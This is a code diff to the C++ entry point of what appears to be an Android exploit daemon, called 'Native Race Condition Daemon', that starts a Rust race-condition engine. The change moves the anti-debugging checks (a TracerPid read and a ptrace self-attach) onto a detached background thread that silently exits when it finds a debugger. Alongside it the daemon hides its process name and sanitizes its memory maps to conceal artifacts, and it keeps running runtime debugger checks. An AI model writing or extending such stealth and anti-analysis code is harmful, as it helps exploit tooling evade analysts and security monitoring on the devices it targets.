@@ -3,6 +3,7 @@
 #include <cstdlib>
 #include <cstring>
 #include <fcntl.h>
+#include <pthread.h>
 #include <sys/mman.h>
 #include <sys/prctl.h>
 #include <sys/ptrace.h>
@@ -103,6 +104,34 @@ void sanitize_memory_maps() {
   // Simulation: Log that we are hiding artifacts
 }
 
+// ---------------------------------------------------------------------------
+// Background anti-debugging thread
+//
+// Rationale:
+//   check_ptrace_traceme() calls fork()+waitpid(), which can block for an
+//   indeterminate amount of time if the child is scheduled out or if the
+//   system is under load.  Running this on the main thread risks blocking
+//   long enough to trigger the Android Watchdog (default 30-second timeout),
+//   which kills the daemon and can cascade into a bootloop on some OEM ROMs.
+//
+//   Moving ALL anti-debugging checks to a background pthread ensures the
+//   main thread is free to call rust_start_race_engine() and enter its
+//   sleep-loop immediately, staying well within watchdog limits.
+// ---------------------------------------------------------------------------
+static void *anti_debug_thread(void * /* unused */) {
+  bool tracer  = check_tracer_pid();
+  bool pt      = check_ptrace_traceme();
+
+  if (tracer || pt) {
+    LOGE("Anti-Debugging triggered in background thread! Exiting.");
+    // Silent exit — do not raise signals on main thread
+    _exit(1);
+  } else {
+    LOGI("Anti-Debugging checks passed (background thread).");
+  }
+  return nullptr;
+}
+
 int main(int argc, char **argv) {
   (void)argc;
   (void)argv;
@@ -113,23 +142,33 @@ int main(int argc, char **argv) {
 
   LOGI("Starting Native Race Condition Daemon...");
 
-  // 1. Anti-Detection: Hide process name
+  // 1. Anti-Detection: Hide process name immediately (non-blocking)
   hide_process_name();
 
-  // 2. Anti-Debugging Checks
-  if (check_tracer_pid() || check_ptrace_traceme()) {
-    LOGE("Anti-Debugging triggered! Exiting to prevent analysis.");
-    // In a real scenario, we might just exit silently or fake a crash
-    // exit(1);
-  } else {
-    LOGI("Anti-Debugging checks passed.");
-  }
-
-  // 3. Anti-Detection: Sanitize memory maps
+  // 2. Anti-Detection: Sanitize memory maps (non-blocking simulation)
   sanitize_memory_maps();
 
-  // 4. Start Multi-Factor Race Condition Engine
-  // Pin to Core 0 for scheduler stability
+  // 3. Anti-Debugging: spawn checks on a background thread.
+  //    The main thread MUST NOT block here — doing so risks triggering the
+  //    Android Watchdog (30 s timeout) on OEM ROMs with slow schedulers.
+  pthread_t anti_debug_tid;
+  pthread_attr_t attr;
+  pthread_attr_init(&attr);
+  pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
+  if (pthread_create(&anti_debug_tid, &attr, anti_debug_thread, nullptr) != 0) {
+    PLOGE("Failed to spawn anti-debugging thread — running inline (may block)");
+    // Fallback: run inline only if thread creation fails
+    if (check_tracer_pid() || check_ptrace_traceme()) {
+      LOGE("Anti-Debugging triggered! Exiting.");
+    } else {
+      LOGI("Anti-Debugging checks passed.");
+    }
+  }
+  pthread_attr_destroy(&attr);
+
+  // 4. Start Multi-Factor Race Condition Engine immediately.
+  //    This must happen on the main thread without waiting for anti-debug
+  //    to complete, so the watchdog timer never fires.
   size_t target_core = 0;
   LOGI("Initializing Race Engine on Core %zu...", target_core);
 
@@ -138,12 +177,10 @@ int main(int argc, char **argv) {
 
   // The Rust engine runs an infinite loop in a spawned thread,
   // but the main thread here should also stay alive or manage lifecycle.
-  // For now, we block here.
   while (true) {
     sleep(10);
-    // Periodic health check or adaptive fallback logic could go here
-
-    // Continuous self-check
+    // Periodic health check: tracer-pid check is fast (just a file read),
+    // so it is safe to run on the main thread periodically.
     if (check_tracer_pid()) {
       LOGE("Runtime debugger attachment detected!");
       // countermeasures...
